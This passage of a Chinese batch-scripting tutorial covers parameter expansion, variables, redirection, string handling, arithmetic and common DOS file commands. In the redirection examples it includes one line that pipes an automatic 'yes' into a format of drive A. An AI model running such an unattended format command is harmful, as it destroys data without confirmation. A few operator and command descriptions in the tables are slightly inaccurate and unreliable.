扩充的路径指含有短名： %~s1 Echo 扩充到文件属性： %~a1 Echo 扩充到文件的日期/时间： %~t1 Echo 扩充到文件的大小： %~z1 Echo 扩展到驱动器号和路径：%~dp1Echo 扩展到文件名和扩展名：%~nx1Echo 扩展到类似 DIR 的输出行：%~ftza1Echo.Goto :eof</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/使用参数-display.png" alt="使用参数-display"></center><p><strong>注</strong>：</p><ul><li>批脚本里的 %* 指出所有的参数(如 %1 %2 %3 %4 %5 …)</li><li>批参数(%n)的替代已被增强。您可以使用以下语法:<pre><code>%~1           - 删除引号(&quot;)，扩充 %1%~f1          - 将 %1 扩充到一个完全合格的路径名%~d1         - 仅将 %1 扩充到一个驱动器号%~p1         - 仅将 %1 扩充到一个路径%~n1         - 仅将 %1 扩充到一个文件名%~x1         - 仅将 %1 扩充到一个文件扩展名%~s1         - 扩充的路径指含有短名%~a1         - 将 %1 扩充到文件属性%~t1          - 将 %1 扩充到文件的日期/时间%~z1         - 将 %1 扩充到文件的大小%~path:1  -查找列在**PATH环境变量**的目录里查找 %1，并扩展到找到的第一个文件的驱动器号和路径%~ftza1     - 将 %1 扩展到类似 DIR 的输出行。</code></pre></li><li>在上面的例子中，%1 和 PATH 可以被其他有效数值替换。%~ 语法被一个有效参数号码终止。%~ 修定符不能跟 %*使用注意：<pre><code>参数扩充时不理会参数所代表的文件是否真实存在，均以当前目录进行扩展要理解上面的知识，上面的例子很关键。</code></pre></li></ul><h4 id="直接传递参数"><a href="#直接传递参数" class="headerlink" title="直接传递参数"></a>直接传递参数</h4><p>​        直接传递参数，即在使用<code>call</code>命令时，不使用任何参数，在<strong>子函数</strong>或<strong>子批处理</strong>里面<strong>直接对父批处理里面的变量进行修改</strong>。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 乱序重排@echo offsetlocal enabledelayedexpansionset var=aCdehiM,?mnrstW yecho %var%:: 调用子函数call :dealsetlocal disabledelayedexpansion:: 串替换set var=%var:?=!%echo %var%pause>nulexit:dealset tm=!var!set var=:: 串截取与拼接for %%i in (6,3,11,11,16,15,1,4,11,5,12,13,9,0,12,7,15,14,5,10,2,16,18,8) do (set var=!var!!tm:~%%i,1!)goto :eof</code></pre><ul><li>goto :eof为子程序返回命令，若子函数本身就在批处理文件的末尾的话，此命令可省略</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/直接传递参数-display.png" alt="直接传递参数-display"></center><h4 id="间接传递参数"><a href="#间接传递参数" class="headerlink" title="间接传递参数"></a>间接传递参数</h4><p>​        间接传递参数，即在使用call命令时，在其后面添加参数。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">call {[:label] | [ChildBatch]} Parameter1 Parameter2 ... ParameterN</code></pre><ul><li>调用可是子函数，也可以是子批处理</li><li>子函数或子批处理中不需要定义形参及其个数</li><li>子函数或子批处理接受的参数依次存储在%1-%9中</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offcall :deal aaa bbb "c c" ddd eeepause>nulexit:dealecho %%0 = %0echo %%1 = %1echo %%2 = %2echo %%3 = %3echo %%4 = %4echo %%5 = %5</code></pre><ul><li>%0显示的是子函数的标号，而不是父批处理的文件名全程</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/间接传递参数-display.png" alt="间接传递参数-display"></center><h3 id="使用变量"><a href="#使用变量" class="headerlink" title="使用变量"></a>使用变量</h3><h4 id="用户变量"><a href="#用户变量" class="headerlink" title="用户变量"></a>用户变量</h4><p>​        编写批处理程序时，用户根据需要自己定义的变量称为用户变量。    用户变量使用set命令来设置。    </p><h4 id="系统变量"><a href="#系统变量" class="headerlink" title="系统变量"></a>系统变量</h4><p>​        系统变量是<strong>操作系统提前定义</strong>好的一组变量，可以适用于任何批处理，主要包括：硬件类、操作系统类、文件路径类、系统时间类等。</p><p><strong>常用系统变量</strong>：</p><table><thead><tr><th align="center">系统变量</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">ComputerName</td><td align="center">计算机名</td></tr><tr><td align="center">ComSpec</td><td align="center">cmd.exe完整路径名</td></tr><tr><td align="center">HomeDrive</td><td align="center">系统分区盘符(一般为C)</td></tr><tr><td align="center">Path</td><td align="center">可执行文件默认搜索路径</td></tr><tr><td align="center">ProgramFiles</td><td align="center">软件默认安装路径</td></tr><tr><td align="center">Prompt</td><td align="center">个性化设置cmd的必备武器</td></tr><tr><td align="center">SystemDrive</td><td align="center">包含系统根目录的分区</td></tr><tr><td align="center">SystemRoot</td><td align="center">系统根目录路径(默认C:\Windows)</td></tr><tr><td align="center">Temp、Tmp</td><td align="center">程序等可使用的临时目录(可修改)</td></tr><tr><td align="center">UserName</td><td align="center">当前用户名</td></tr><tr><td align="center">UserProfile</td><td align="center">当前用户的配置目录</td></tr><tr><td align="center">WinDir</td><td align="center">操作系统路径</td></tr><tr><td align="center">date</td><td align="center">日期</td></tr><tr><td align="center">time</td><td align="center">时间</td></tr></tbody></table><ul><li>系统变量可以使用<code>set</code>命令来显示</li></ul><h4 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h4><p>​        变量应用指直接用变量名来操作变量。</p><ul><li>通常使用”%”和”!”来获取变量的值。</li><li>在<strong>for循环</strong>中重复对同一变量多次赋值时需要使用”!”，使用”!”调用变量时，要首先“<a href="#enabledelayedexpansion">启用延迟环境变量扩充</a>”</li><li>开启延时环境变量扩充之后，所有的”!”都被视为特殊符号，即使使用”^!”也不可以输出”!”，要输出”!”必须要“<a href="#disabledelayedexpansion">停用延迟环境变量扩充</a>”</li></ul><h3 id="使用筛选器"><a href="#使用筛选器" class="headerlink" title="使用筛选器"></a>使用筛选器</h3><p>​        命令筛选器与命令重定向竖线(|)联合使用，它实际上是一个命令，包含在可读取命令的输入、可转换输入并写入输出的命令中，筛选器命令可以帮助排序、查看和选择部分命令输出。</p><p><strong>eg</strong>:</p><pre class=" language-bat"><code class="language-bat">@echo off:: more查看C中目录tree C:\ | more:: 查找指定文件中的指定字符串，并将结果显示find "more" < demo.bat:: 查找指定文件中的指定字符串，并将存储在demo.txt文件中find "more" < demo.bat > demo.txtpausedel demo.txt</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/使用筛选器-display-1.png" alt="使用筛选器-display-1"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/使用筛选器-display-2.png" alt="使用筛选器-display-2"></center><h3 id="使用命令重定向操作符"><a href="#使用命令重定向操作符" class="headerlink" title="使用命令重定向操作符"></a>使用命令重定向操作符</h3><p>​        使用重定向操作符将命令输入和输出的数据流从默认位置重定向到其他位置。输入或输出数据流的位置被称为句柄。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 重定向输入sort < demo.txt:: 重定向输出dir > demo.txt:: 重定向附加输出dir >> demo.txt:: 使用管道操作符dir | sort:: 自动格式化A盘(无效)echo y|format a: /s /q /v:system</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/重定向输入-display.png" alt="重定向输入-display"></center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/重定向输出.png" alt="重定向输出"></center><p><img src="../../../../Administrator/Fodder/Blogs/MarkdownImgs/%E8%84%9A%E6%9C%AC%E7%BB%83%E4%B9%A0/%E6%89%B9%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/%E9%87%8D%E5%AE%9A%E5%90%91%E9%99%84%E5%8A%A0%E8%BE%93%E5%87%BA.png" alt="重定向附加输出"></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/管道重定向排序输出.png" alt="管道重定向排序输出"></center><h2 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h2><p>​        对字符串的操作。包括：串拷贝、串拼接、串比较、串替换、串截取等。</p><h3 id="串拷贝"><a href="#串拷贝" class="headerlink" title="串拷贝"></a>串拷贝</h3><p>​        在DOS批处理中，串拷贝可以通过set的赋值操作来实现。（批处理中变量不区分类型）</p><h3 id="串拼接"><a href="#串拼接" class="headerlink" title="串拼接"></a>串拼接</h3><p>​        DOS批处理中，串拼接的操作也很简单，可以使用如下的语法来实现：</p><pre class=" language-bat"><code class="language-bat">@echo offset aa=伟大的中国！set bb=我为你自豪！:: 连续输出echo %aa%%bb%echo aa=%aa%echo bb=%bb%:: 拼接后赋给变量set aa=%aa%%bb%echo aa=%aa%pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/串拼接.png" alt="串拼接"></center><h3 id="串比较"><a href="#串比较" class="headerlink" title="串比较"></a>串比较</h3><p>​        DOS批处理中没有专门命令来组织串操作，所以串的比较需要通过<a href="#strCompare"><strong>条件语句</strong></a>来实现</p><h3 id="串替换"><a href="#串替换" class="headerlink" title="串替换"></a>串替换</h3><p>​        DOS批处理中的<a href="#strReplace">串替换</a>是通过set命令来实现的</p><h3 id="串截取"><a href="#串截取" class="headerlink" title="串截取"></a>串截取</h3><p>​        DOS批处理中的<a href="#strSplit">串截取</a>是通过set命令来实现的</p><h3 id="串扩充"><a href="#串扩充" class="headerlink" title="串扩充"></a>串扩充</h3><p>​        DOS批处理中独有。</p><p>​        “扩充”这个词来自于Microsoft自己的翻译，意思就是对表示文件路径的字符串进行特殊的处理，具体功能罗列如下：</p><table><thead><tr><th align="center">字符串</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">~I(大写i)</td><td align="center">s删除任何引号，扩充%I</td></tr><tr><td align="center">%~fI</td><td align="center">将%I扩充到一个完全合格的路径名</td></tr><tr><td align="center">%~dI</td><td align="center">仅将%I扩充到一个驱动器号</td></tr><tr><td align="center">%~pI</td><td align="center">仅将%I扩充到一个路径</td></tr><tr><td align="center">%~nI</td><td align="center">仅将%I扩充到一个文件名</td></tr><tr><td align="center">%~xI</td><td align="center">仅将%I扩充到一个文件扩展名</td></tr><tr><td align="center">%~sI</td><td align="center">扩充的路径只含有短名</td></tr><tr><td align="center">%~aI</td><td align="center">将%I扩充到文件的文件属性</td></tr><tr><td align="center">%~tI</td><td align="center">将%I扩充到文件的日期/时间</td></tr><tr><td align="center">%~zI</td><td align="center">将%I扩充到文件的大小</td></tr><tr><td align="center">%~PATH:I</td><td align="center">查找列在路径环境变量的目录，并将%I扩充到找到的第一个驱动器号和路径</td></tr><tr><td align="center">%~tfzaI</td><td align="center">将%I扩充到类似输出线路的DIR</td></tr></tbody></table><ul><li>字符串扩充的条件<ul><li>该字符串代表一个文件路径</li><li>变量要用% x来表示，x可取a-zA-Z0-9共62个字符中的任意一个</li></ul></li></ul><p><strong>eg1</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offecho 正在运行的这个批处理：echo 完全路径：%0echo 去掉引号：%~0echo 所在分区：%~d0echo 所处路径：%~p0echo 文件名：%~n0echo 扩展名：%~x0echo 文件属性：%~a0echo 修改时间：%~t0echo 文件大小：%~z0pause>nul</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/串扩充-display-1.png" alt="串扩充-display-1"></center><p><strong>eg2</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offset aa=C:\Windows\PPP\a.btxcall :deal aaa %aa% "c c" ddd eeepause>nulexit:dealecho %%0 = %0echo %%1 = %1echo %%2 = %2echo %%3 = %3echo %%4 = %4echo %%5 = %5</code></pre><ul><li>其中，变量aa在之前是不可以扩充的，通过call命令并将aa作为参数传递给子函数:deal，将aa变量转换成了变量%1，即符合%x格式，从而可以进行字符串扩充。</li><li>至于%x中x取a-z A-Z的形式，可以复习一下for语句，for语句里面的变量就是用%x来表示的，因而可以直接进行扩充。</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/串扩充-display-2.png" alt="串扩充-display-2"></center><h2 id="数值计算"><a href="#数值计算" class="headerlink" title="数值计算"></a>数值计算</h2><p>​        批处理里面的数值计算功能较弱，只能进行整型计算，忽略浮点数的小数部分；同时数值计算的范围也受限于系统位数，对于目前较为常见的32位机来说，数值计算能处理的数值范围为0x80000000h-0x7FFFFFFFh，即-2147483648-+2147483647。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">set /a expression</code></pre><ul><li>expressio：代表计算的表达式，可以跟多个需要用逗号(“,”)隔开</li></ul><p><strong>数值运算符</strong></p><table><thead><tr><th align="center">运算符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">()</td><td align="center">分组</td></tr><tr><td align="center">! ~ -</td><td align="center">一元运算符(逻辑非、按位非、取负)</td></tr><tr><td align="center">* / %</td><td align="center">算数运算符(乘、取商、取余)</td></tr><tr><td align="center">+ -</td><td align="center">算数运算符(加、减)</td></tr><tr><td align="center">&lt;&lt; &gt;&gt;</td><td align="center">逻辑移位(左移一位、右移一位)</td></tr><tr><td align="center">&amp;</td><td align="center">按位与</td></tr><tr><td align="center">^</td><td align="center">按位非</td></tr><tr><td align="center">|</td><td align="center">按位或</td></tr><tr><td align="center">= *= /= %= += -= &amp;= ^= |= &lt;&lt;= &gt;&gt;=</td><td align="center">赋值</td></tr><tr><td align="center">,</td><td align="center">表达式分隔符</td></tr></tbody></table><p><strong>eg</strong>：</p><p><a href="#varCalculate">详细实例</a></p><h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><table><thead><tr><th align="center">特殊符号</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">@</td><td align="center"><font color="red">不回显当前行</font>中的命令</td></tr><tr><td align="center"><code>&gt; filename</code></td><td align="center">重定向输出，覆盖</td></tr><tr><td align="center"><code>&gt;&gt; filename</code></td><td align="center">重定向输出但<font color="red">不覆盖</font>(在末尾追加)</td></tr><tr><td align="center"><code>&lt;</code></td><td align="center">重定向输入</td></tr><tr><td align="center">|</td><td align="center"><font color="red">管道</font>传输命令</td></tr><tr><td align="center">^</td><td align="center"><font color="red">转义字符</font></td></tr><tr><td align="center">&amp;</td><td align="center">允许在一行中使用两个以上不同命令(<font color="red">命令之间独立</font>)</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">允许在一行中使用两个以上不同命令<br>(<font color="red">前面命令执行的结果将影响到后边的命令是否执行</font>)</td></tr><tr><td align="center">“”</td><td align="center">双引号允许在字符串中<font color="red">可包含空格</font></td></tr><tr><td align="center">,</td><td align="center">某些情况下可以<font color="red">当作空格来用</font></td></tr><tr><td align="center">;</td><td align="center">命令相同时，<font color="red">参数</font>之间可以使用分号隔开</td></tr><tr><td align="center">::</td><td align="center">注释该行(直接跳过该行)</td></tr></tbody></table><p><span name="ComoareOp"><strong>比较运算符</strong></span></p><table><thead><tr><th align="center">比较运算符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">==</td><td align="center">等于</td></tr><tr><td align="center">EQU</td><td align="center">等于</td></tr><tr><td align="center">NEQ</td><td align="center">不等于</td></tr><tr><td align="center">LSS</td><td align="center">小于</td></tr><tr><td align="center">LEQ</td><td align="center">小于或等于</td></tr><tr><td align="center">GTR</td><td align="center">大于</td></tr><tr><td align="center">GEQ</td><td align="center">大于或等于</td></tr></tbody></table><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>​        有些命令在执行之后将会返回一定的错误值(errorlevel)，可以通过errorlevel的值<a href="#iferrorlevel">判断命令</a>执行的情况。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offreg add HKCU /v try /f>nulreg delete HKCU /v try /fif errorlevel 0 (echo 删除成功！ ) else (echo 删除失败！)reg delete HKCU /v try /fif %errorlevel%==0 (echo 删除成功！ ) else (echo 删除失败！)pause>nul</code></pre><ul><li>一般情况下，程序或命令成功执行时，返回的errorlevel是0，错误时返回1或更高的值。</li><li>逻辑判断也是根据命令的返回值(errorlevel)进行判断的</li></ul><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/返回值-display.png" alt="返回值-display"></center><h2 id="视窗设置"><a href="#视窗设置" class="headerlink" title="视窗设置"></a>视窗设置</h2><p>​        DOS中提供对视窗进行设置的一些命令，如：title、color、mode、msg等</p><ul><li>title：设置窗体显示的标题</li><li>color：设置窗口背景颜色和字体颜色(xx)</li><li>mode：设置窗体大小。<strong>cols设置宽度，lines设置高度</strong>。</li><li>msg：GUI交互窗口</li></ul><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 设置颜色color [xx]:: 设置宽度和高度mode con [cols=c] [lines=n]:: 信息交互msg username /w /time:seconds message</code></pre><ul><li>[xx]：x为一个十六进制数值，第一个x应用于背景，第二个x应用于前景<ul><li>0 = 黑色      </li><li>1 = 蓝色      </li><li>2 = 绿色      </li><li>3 = 浅绿色     </li><li>4 = 红色       </li><li>5 = 紫色       </li><li>6 = 黄色       </li><li>7 = 白色       </li><li>8 = 灰色</li><li>9 = 淡蓝色</li><li>A = 淡绿色</li><li>B = 淡浅绿色</li><li>C = 淡红色</li><li>D = 淡紫色</li><li>E = 淡黄色</li><li>F = 亮白色</li></ul></li><li>clos：设置宽度</li><li>lines：设置高度</li><li>username：设置用户名</li><li>/w：等待用户响应</li><li>/time:seconds：等待接收器确认消息的时间延迟</li><li>message：要发送的信息</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offset a=10set b=0:texset /a a+=3set /a b+=1:: 设置窗体大小mode con cols=%a% lines=%b%if %a% lss 60 goto :texecho O(∩_∩)O 圣诞快乐 O(∩_∩)Oset a=15,a6,2e,d0,34,8b,4f,9d,5e:: 改变窗口颜色for %%i in (%a%) do (:: ping自己ping -n 2 127.1>nulcolor %%i)::for %%i in (%a%,%a%) do (::ping -n 1 127.1>nul::color %%i::):: 重定向>>ms.txt echo          */.    .   .    *      .>>ms.txt echo          .\*    .    []           * __>>ms.txt echo          */ .   ./\~~~~~~~~~~~~'\. ^|◆>>ms.txt echo           \*   ,/,..,\,...........,\.◆>>ms.txt echo           ^|^| ..▎# ▎田 田 ▎ ^| ▎◆>>ms.txt echo           ^|^| ^&^&▎   ▎       ▎'^|'▎ o>>ms.txt echo           ^|^| ##■■■■■■■■■■〓:: msgmsg %username% /w /time:3600 <ms.txtdel ms.txtpause</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/视窗设置-display.png" alt="视窗设置-display"></center><h2 id="声音设置"><a href="#声音设置" class="headerlink" title="声音设置"></a>声音设置</h2><p>​        批处理中还能以语音的形式展示信息。</p><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo offecho 做好准备，响了啊！！pausecls:: 强大，支持英文、中文，不支持日语mshta vbscript:createobject("sapi.spvoice").speak("Merry Christmas and Happy New Year! 新年快乐!すみません!")(window.close)pauseclsecho.echo 怎么样？呵呵，刺激吧~pause</code></pre><h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">@echo off&mode con cols=80:beginclsset/p file=请输入要处理的文件(Q 键直接退出此脚本):        if /i "%file%"=="Q" goto :eof        if "%file%"=="" goto errorset new=%random%for %%a in (%file%) do set size=%%~za        if "%size%"=="0" goto errorcls&fsutil file createnew %new% %size% >nulecho=&&echo=文件内容所对应的ASCII码的十六进制形式依次为:&echo==========================================================for /f "skip=1 tokens=3" %%a in ('fc /B %new% %file%') do (        set /p=%%a <nul)echo=&echo==========================================================&echo=&echo=&echo=文件内容所对应的ASCII码的十进制形式依次为:&echo==========================================================setlocal EnableDelayedExpansionfor /f "skip=1 tokens=3" %%a in ('fc /B %new% %file%') do (        set num=%%a        set /a num=0x!num!        set /p=!num! <nul)del %new%endlocal&echo;&echo==========================================================&echo;&pauseexit /b 0:error        cls&echo;&echo;        echo         “输入错误” OR “文件大小为零”，请重新输入……        del %new% >nul 2>nul        set file=        set new=        pause>nul&goto :beginl</code></pre><p><strong>结果展示</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/ProgrammingLanguages/Batch/批处理笔记/ASCII-display.png" alt="ASCII-display"></center><h2 id="常用DOS命令"><a href="#常用DOS命令" class="headerlink" title="常用DOS命令"></a>常用DOS命令</h2><h3 id="文件夹管理"><a href="#文件夹管理" class="headerlink" title="文件夹管理"></a>文件夹管理</h3><h4 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h4><p>​    (<font color="blue">change directory</font>)跳转到指定目录下</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">cd [绝对路径]::跳转到指定的绝对路径下cd ..::跳转到当前目录的父目录cd \::跳转到根目录</code></pre><h4 id="md"><a href="#md" class="headerlink" title="md"></a>md</h4><p>​    (<font color="blue">make directory</font>)创建目录</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">md [绝对路径] | [相对路径]::在指定位置创建文件夹md [文件夹名称]:: 在当前路径下创建文件夹</code></pre><p><strong>注</strong>：</p><ul><li>路径中的文件夹不存在时会自动创建该文件夹</li></ul><h4 id="rd"><a href="#rd" class="headerlink" title="rd"></a>rd</h4><p>​    (<font color="blue">remove directory</font>)删除目录</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">rd [相对路径] | [绝对路径] | [文件夹名称]</code></pre><p><strong>注</strong>：</p><ul><li>删除的目录不能有子文件夹</li><li>要删除的目录下不能有文件</li><li>不能删除当前目录</li><li>根目录不能被删除</li><li><font color="red">创建容易删除很难</font></li></ul><h4 id="dir"><a href="#dir" class="headerlink" title="dir"></a>dir</h4><p>​    (<font color="blue">directory</font>)展示当前目录下的文件和文件夹</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">::展示目录下的文件和文件夹dir [目录] [/p] [/w] [/ad] [/a] [/s]</code></pre><p><strong>说明</strong>：</p><ul><li>/p：分屏显示文件夹内容</li><li>/w：宽屏显示文件夹内容（文件夹以[<em>dirName</em>]形式显示，文件以文件名显示）</li><li>/ad：只显示文件夹而不显示文件</li><li>/a：显示隐藏文件</li><li>/s：显示指定目录和所有子目录中的文件</li></ul><h4 id="tree"><a href="#tree" class="headerlink" title="tree"></a>tree</h4><p>​    展示指定启动器的目录子树</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">tree [盘符] [/f] [/a]</code></pre><p><strong>说明</strong>：</p><ul><li>盘符：显示所有的目录子树</li><li>/f：显示目录同时显示文件名（默认只显示目录）</li><li>/a：以ASCII码显示目录树</li></ul><h4 id="path"><a href="#path" class="headerlink" title="path"></a>path</h4><h4 id="xcopy"><a href="#xcopy" class="headerlink" title="xcopy"></a>xcopy</h4><p>​        复制文件或目录到指定目录下</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 拷贝文件xcopy [源目录] [目的目录]:: 拷贝目录xcopy [源文件名] [目的目录]:: 拷贝文件和目录xcopy *.* [目的目录] {/s | /e} /v</code></pre><ul><li>/s：拷贝非空子目录</li><li>/e：拷贝所有目录</li><li>/v：拷贝后检验，会影响速度</li></ul><h3 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h3><h4 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h4><p>​        复制源文件到到指定位置</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">copy [源文件] [目的文件]copy con 目标文件名</code></pre><p><strong>注</strong>：</p><ul><li>源文件与目标文件不能相同</li><li>目标文件省略时，复制到当前文件夹下</li><li>不能复制只读属性的文件</li><li>结合通配符可复制多个文件</li></ul><h4 id="type"><a href="#type" class="headerlink" title="type"></a>type</h4><p>​        在命令行中显示<strong>文本文件</strong>的内容</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">type [文本文件名称]</code></pre><h4 id="del"><a href="#del" class="headerlink" title="del"></a>del</h4><p>​        删除一个或数个文件</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">del {[文件名] | [*.后缀名]} [/p] [/q] [/f] [/s]</code></pre><ul><li>/p：删除每个文件之前提示确认信息</li><li>/q：<font color="red">安静模式</font>，删除全局通配符时，不要求确认</li><li>/f：强制删除只读文件</li><li>/s：从所有子目录删除指定文件</li></ul><h4 id="move"><a href="#move" class="headerlink" title="move"></a>move</h4><p>​        移动文件或更改目录名</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 将文件移动到新的目录下move [文件名] [目的目录]:: 更改目录的名称move [目录名] [目录名] </code></pre><h4 id="ren"><a href="#ren" class="headerlink" title="ren"></a>ren</h4><p>​        重命名文件</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ren [源文件名] [新的文件名]</code></pre><h4 id="replace"><a href="#replace" class="headerlink" title="replace"></a>replace</h4><p>​        替换文件</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>​        搜索文件内容</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">find "string" filename</code></pre><p><strong>说明</strong>：</p><ul><li>string：待查找的字符串</li><li>filename：文件名(或文件路径)</li><li>当找到时，回显字符串所在行的全部内容；否则，回显空行</li></ul><h4 id="fc"><a href="#fc" class="headerlink" title="fc"></a>fc</h4><p>​        比较两个文件或文件集并展示它们之间的不同</p><h4 id="attrib"><a href="#attrib" class="headerlink" title="attrib"></a>attrib</h4><p>​        显示或更改文件属性</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ATTRIB [+R | -R] [+A | -A] [+S | -S] [+H | -H] [+O | -O] [+I | -I] [+X | -X] [+P | -P] [+U | -U]       [drive:][path][filename] [/S [/D]] [/L]</code></pre><ul><li>+/-R：设置或清除文件的只读属性</li><li>+/-A：设置或清除文件的存档属性</li><li>+/-S：设置或清除文件的系统属性</li><li>+/-H：设置或清除文件的隐藏属性</li><li>drive:path filename:指示文件的位置</li><li>/s：处理当前文件夹及其所有子文件夹中的匹配文件</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 将D盘下demo文件夹中的1.txt文件设置为只读attrib +r D:\demo\1.txt /s:: 将D盘下demo文件夹中的1.txt文件的属性设置为“存档”attrib +a D:\demo\1.txt /s:: 将D盘下demo文件夹中的1.txt文件的属性设置为“系统”属性attrib +s D:\demo\1.txt /s:: 将D盘下demo文件夹中的1.txt文件的属性设置为“隐藏”attrib +h D:\demo\1.txt /s:: 清除D盘下demo文件夹中的1.txt文件的“隐藏”属性attrib -h D:\demo\1.txt /s</code></pre><h4 id="openfiles"><a href="#openfiles" class="headerlink" title="openfiles"></a>openfiles</h4><p>​        允许管理员列出系统上已打开的文件和文件夹或与其断开连接。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">openfiles /parameter [arguments]</code></pre><ul><li>parameter：<ul><li>disconnect：中断至少一个打开的文件的连接</li><li>query：显示所有从本地或从共享文件夹打开的文件</li><li>local：启用/禁用本地打开文件的显示</li></ul></li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 断开IP地址为192.168.1.12的远程计算机中所有被打开的共享文件openfiles /disconnect /s 192.168.1.12 /id *:: 断开用户名为Guest、IP为192.168.1.12的远程计算机中所有被打开的文件openfiles /disconnect /s 192.168.1.12 /a Guest:: 断开IP为192.168.1.12的远程计算机中所有以“读/写”方式打开的文件openfiles /disconnect /s 192.168.1.12 /o read/write:: 显示IP为192.168.1.12的计算机的已经打开的远程文件openfiles /query /s 192.168.1.12:: 以Table格式显示IP为192.168.1.12的远程计算机中被打开的文件的基本信息openfiles /query /s 192.168.1.12 /fo table /v</code></pre><h4 id="takeown"><a href="#takeown" class="headerlink" title="takeown"></a>takeown</h4><p>​        该工具以重新分配文件所有权的方式允许管理员重新获取先前被拒绝访问的文件访问权。</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">TAKEOWN [/S system [/U username [/P [password]]]]        /F filename [/A] [/R [/D prompt]]</code></pre><ul><li>/f：指定文件或目录名模式</li><li>/a：将所有权给予管理员组，而不是当前用户</li><li>/r：递归，指示工具运行于指定的目录和子目录的文件上</li></ul><p><strong>eg</strong>：</p><pre class=" language-bat"><code class="language-bat">:: 设置IP为192.168.1.12远程计算机为demo文件夹中的1.txt的访问权限由计算机的管理员所拥有takeown /f \\192.168.1.12\d:\demo\1.txt:: 设置本地管理员组拥有IP为192.168.1.12的远程计算机的demo文件或文件夹的访问权限takeown /f \\192.168.1.12\d:\demo\1.txt /a:: 设置管理员拥有IP为192.168.1.12远程计算机的demo文件夹（包括其子文件）的访问权限:: takeown /f \\192.168.1.12\d:\demo /r</code></pre><h4 id="assoc"><a href="#assoc" class="headerlink" title="assoc"></a>assoc</h4><p>​        显示或修改文件扩展名关联</p><p><strong>语法</strong>：</p><pre class=" language-bat"><code class="language-bat">ASSOC 